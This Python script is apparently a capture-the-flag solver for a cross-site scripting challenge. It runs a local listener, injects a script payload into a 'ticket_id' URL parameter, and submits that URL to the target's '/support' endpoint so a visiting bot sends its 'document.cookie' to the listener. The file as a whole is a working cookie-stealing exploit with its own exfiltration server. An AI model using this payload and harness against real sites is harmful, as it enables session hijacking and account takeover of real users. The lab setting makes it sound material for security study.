import sys
import time
import urllib.parse
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

FLAG = ""

class CatchHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global FLAG
        if '/?c=' in self.path:
            FLAG = urllib.parse.unquote(self.path.split('/?c=')[1])
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Caught")
        else:
            self.send_response(200)
            self.end_headers()

def start_server():
    server = HTTPServer(('0.0.0.0', 8000), CatchHandler)
    server.handle_request() 

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    webhook_url = "http://host.docker.internal:8000" 
    threading.Thread(target=start_server, daemon=True).start()
    
    payload = f"<script>location='{webhook_url}/?c=' + document.cookie</script>"
    encoded_payload = urllib.parse.quote(payload)
    malicious_url = f"http://127.0.0.1/?ticket_id={encoded_payload}"
    
    data = urllib.parse.urlencode({'url': malicious_url}).encode('utf-8')
    req = urllib.request.Request(f"{target}/support", data=data, method='POST')
    
    try:
        urllib.request.urlopen(req)
        time.sleep(5)
        if FLAG:
            print(f"[+] Exploit successful! Flag: {FLAG}")
            sys.exit(0)
        else:
            print("[-] Failed.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
